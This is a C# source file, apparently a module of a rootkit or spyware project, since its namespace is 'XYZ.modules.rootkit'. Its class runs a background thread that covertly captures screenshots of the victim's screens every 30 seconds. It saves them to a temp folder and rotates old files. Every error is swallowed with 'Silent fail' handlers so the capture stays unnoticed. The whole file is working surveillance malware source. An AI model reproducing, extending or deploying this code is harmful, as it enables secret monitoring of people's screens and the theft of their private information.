using System;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace XYZ.modules.rootkit
{
    public class ScreenshotModule
    {
        private Thread screenshotThread;
        private bool isCapturing = false;
        private string screenshotDirectory;
        private int captureInterval = 30000; // 30 seconds
        private List<string> capturedScreenshots;
        private bool captureMultipleScreens = false;

        public ScreenshotModule()
        {
            capturedScreenshots = new List<string>();
            screenshotDirectory = Path.Combine(Path.GetTempPath(), "screenshots");
            if (!Directory.Exists(screenshotDirectory))
            {
                Directory.CreateDirectory(screenshotDirectory);
            }
        }

        public void StartScreenshots()
        {
            try
            {
                if (!isCapturing)
                {
                    isCapturing = true;
                    screenshotThread = new Thread(CaptureScreenshots);
                    screenshotThread.IsBackground = true;
                    screenshotThread.Start();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void StopScreenshots()
        {
            try
            {
                isCapturing = false;
                if (screenshotThread != null && screenshotThread.IsAlive)
                {
                    screenshotThread.Join(1000); // Wait up to 1 second for thread to finish
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void CaptureScreenshots()
        {
            try
            {
                while (isCapturing)
                {
                    try
                    {
                        List<string> filePaths = CaptureScreen();
                        if (filePaths != null && filePaths.Count > 0)
                        {
                            capturedScreenshots.AddRange(filePaths);
                            
                            // Limit the number of stored screenshots to prevent disk filling
                            while (capturedScreenshots.Count > 100)
                            {
                                try
                                {
                                    string oldestFile = capturedScreenshots[0];
                                    if (File.Exists(oldestFile))
                                    {
                                        File.Delete(oldestFile);
                                    }
                                    capturedScreenshots.RemoveAt(0);
                                }
                                catch (Exception)
                                {
                                    // Continue with next file
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Silent fail
                    }
                    
                    Thread.Sleep(captureInterval);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private List<string> CaptureScreen()
        {
            try
            {
                List<string> capturedFiles = new List<string>();
                
                // Capture all screens if multiple screens are enabled
                if (captureMultipleScreens && Screen.AllScreens.Length > 1)
                {
                    foreach (Screen screen in Screen.AllScreens)
                    {
                        try
                        {
                            string filePath = CaptureSingleScreen(screen);
                            if (!string.IsNullOrEmpty(filePath))
                            {
                                capturedFiles.Add(filePath);
                            }
                        }
                        catch (Exception)
                        {
                            // Continue with next screen
                        }
                    }
                }
                else
                {
                    // Capture primary screen only
                    string filePath = CaptureSingleScreen(Screen.PrimaryScreen);
                    if (!string.IsNullOrEmpty(filePath))
                    {
                        capturedFiles.Add(filePath);
                    }
                }
                
                return capturedFiles;
            }
            catch (Exception)
            {
                return new List<string>();
            }
        }

        private string CaptureSingleScreen(Screen screen)
        {
            try
            {
                // Create a bitmap of the screen
                Rectangle bounds = screen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    }
                    
                    // Save the screenshot with timestamp and screen info
                    string fileName = "screenshot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + 
                                    (captureMultipleScreens ? "_screen" + screen.DeviceName.Replace("\\\\.\\DISPLAY", "") : "") + 
                                    ".png";
                    string filePath = Path.Combine(screenshotDirectory, fileName);
                    bitmap.Save(filePath, ImageFormat.Png);
                    return filePath;
                }
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public void SetCaptureInterval(int intervalMs)
        {
            try
            {
                captureInterval = intervalMs;
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public List<string> GetCapturedScreenshots()
        {
            return new List<string>(capturedScreenshots);
        }

        public void ClearScreenshots()
        {
            try
            {
                foreach (string filePath in capturedScreenshots)
                {
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }
                }
                capturedScreenshots.Clear();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void SetScreenshotDirectory(string directory)
        {
            try
            {
                if (Directory.Exists(directory))
                {
                    screenshotDirectory = directory;
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public string GetScreenshotDirectory()
        {
            return screenshotDirectory;
        }

        // Method to capture a screenshot immediately
        public string CaptureScreenshotNow()
        {
            try
            {
                List<string> files = CaptureScreen();
                return files.Count > 0 ? files[0] : string.Empty;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        // Method to set whether to capture multiple screens
        public void SetCaptureMultipleScreens(bool captureMultiple)
        {
            captureMultipleScreens = captureMultiple;
        }

        // Method to get whether multiple screens are being captured
        public bool GetCaptureMultipleScreens()
        {
            return captureMultipleScreens;
        }

        // Method to get the number of captured screenshots
        public int GetScreenshotCount()
        {
            return capturedScreenshots.Count;
        }

        // Method to get the total size of captured screenshots
        public long GetTotalScreenshotSize()
        {
            try
            {
                long totalSize = 0;
                foreach (string filePath in capturedScreenshots)
                {
                    if (File.Exists(filePath))
                    {
                        totalSize += new FileInfo(filePath).Length;
                    }
                }
                return totalSize;
            }
            catch (Exception)
            {
                return 0;
            }
        }

        // Method to delete the oldest screenshots to limit storage
        public void LimitStorage(int maxScreenshots)
        {
            try
            {
                while (capturedScreenshots.Count > maxScreenshots)
                {
                    try
                    {
                        string oldestFile = capturedScreenshots[0];
                        if (File.Exists(oldestFile))
                        {
                            File.Delete(oldestFile);
                        }
                        capturedScreenshots.RemoveAt(0);
                    }
                    catch (Exception)
                    {
                        // Continue with next file
                        capturedScreenshots.RemoveAt(0);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}